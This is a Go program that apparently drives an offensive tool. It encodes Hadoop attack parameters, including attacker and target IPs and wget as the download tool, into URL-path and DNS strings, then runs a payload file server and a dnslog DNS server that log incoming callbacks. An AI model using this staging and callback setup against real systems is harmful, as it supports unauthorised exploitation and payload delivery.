package main

import (
	"encoding/json"
	"fmt"
	"github.com/sbot/server"
	"github.com/sbot/utils/netutils"
	"os"
)


func getReq(fname string) (freq string,dreq string) {


	ucr := &netutils.URLPathCrypt{
		Fname:        fname,
		AttackType:   "hadoop",
		AttackIP:     "192.168.1.151",
		TargetIP:     "192.168.1.152",
		TargetPort:   8080,
		DownloadTool: "wget",
	}
	
	dcr := &netutils.DNSDomainCrypt{
		AttackType: "hadoop",
		AttackIP:   "192.168.1.151",
		TargetIP:   "192.168.1.152",
		TargetPort: 8080,
	}



	return netutils.URLPathCryptToString(ucr),netutils.DNSDomainCryptToString(dcr)

}


func main(){


	fmt.Println(netutils.IPv4StrBig(3232235927))
	fmt.Println(getReq(os.Args[2]))

	cfg := &server.FileServerConfig{
		RootDir: os.Args[1],
		Host:    "0.0.0.0",
		Port:    8080,
	}

	dnsCfg := &server.DNSServerConfig{SubDomain:"dnslog.gbw3bao.com",DefaultIP:"127.0.0.1"}

	f := server.NewFileServer(cfg)
	d := server.NewDNSServer(dnsCfg)

	go f.Start()
	go d.Start()

	fsub := f.NewFileDownloadRequestSub()
	dsub := d.NewDNSRequestSub()

	for {

		select {

		case fr := <- fsub.Sub():

			data,_:= json.Marshal(fr)

			fmt.Println(string(data))

		case dr := <- dsub.Sub():
			data,_:= json.Marshal(dr)
			fmt.Println(string(data))

		}

	}

}

